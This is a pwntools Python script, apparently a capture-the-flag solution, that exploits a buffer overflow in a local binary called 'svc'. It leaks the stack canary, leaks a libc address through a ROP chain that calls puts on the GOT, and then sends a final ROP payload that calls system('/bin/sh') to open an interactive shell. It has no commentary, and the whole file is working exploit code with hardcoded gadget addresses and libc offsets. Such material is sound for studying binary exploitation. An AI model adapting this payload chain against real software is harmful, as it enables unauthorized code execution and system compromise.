from pwn import *
import time

pwn = process("./svc")
#gdb.attach(pwn, '''
#	b *0x00400cce
#	b *0x00400cd3
#	c
#	''')
e = ELF("svc")

pop_rdi = p64(0x0000000000400ea3) # pop rdi; ret;
puts_plt = 0x004008d0
puts_got = 0x602018
main = 0x400a96

puts_libc_offset = 0x6f690
system_libc_offset = 0x45390
binsh_libc_offset = 0x18cd57

def leak_canary():
	pwn.recvuntil(b"-------------------------\n>>")
	pwn.sendline(b'1')
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.send(b'\x41' * 0xa9)
	pwn.recvuntil(b"-------------------------\n>>")
	pwn.sendline(b'2')
	'''
	print(pwn.recvline())
	print(pwn.recvline())
	print(pwn.recvline())
	print(pwn.recvline())
	print(pwn.recvline())
	'''
	pwn.recvuntil(b'\x41' * 0xa9)
	canary = pwn.recv(7)
	canary = u64(b"\x00" + canary)
	print("\n[>] Leaking canary...\n[>] Canary: {}".format(hex(canary)))
	return canary

def leak_libc(canary):
	print("[>] Leaking libc base address...")
	pwn.recvuntil(b"-------------------------\n>>")
	pwn.sendline(b'1')
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	payload = b'\x41' * 0xa8
	payload += p64(canary)
	payload += b'\x42' * 0x8
	payload += pop_rdi
	payload += p64(puts_got)
	payload += p64(puts_plt)
	payload += p64(main)
	pwn.send(payload)
	pwn.recvuntil(b"-------------------------\n>>")
	pwn.sendline(b'3')
	pwn.recvuntil(b"[*]BYE ~ TIME TO MINE MIENRALS...\n")
	libc_puts = pwn.recvline().strip()
	libc_puts = u64(libc_puts + b"\x00" * (8 - len(libc_puts)))
	print("[>] libc puts address: {}".format(hex(libc_puts)))
	libc_base = libc_puts - puts_libc_offset
	print("[>] libc base address: {}".format(hex(libc_base)))
	return libc_base

def send_final_payload(libc_base, canary):
	system_libc = libc_base + system_libc_offset
	binsh_libc = libc_base + binsh_libc_offset
	print("[>] libc system address: {}".format(hex(system_libc)))
	print("[>] libc /bin/sh address: {}".format(hex(binsh_libc)))
	pwn.recvuntil(b"-------------------------\n>>")
	pwn.sendline(b'1')
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	payload = b"\x41" * 0xa8
	payload += p64(canary)
	payload += b"\x42" * 0x8
	payload += pop_rdi
	payload += p64(binsh_libc)
	payload += p64(system_libc)
	print("[>] Sending final payload...")
	pwn.send(payload)
	print("[>] Triggering exploit...")
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.recvline()
	pwn.sendline(b'3')

canary = leak_canary()
libc_base = leak_libc(canary)
send_final_payload(libc_base, canary)
pwn.interactive()
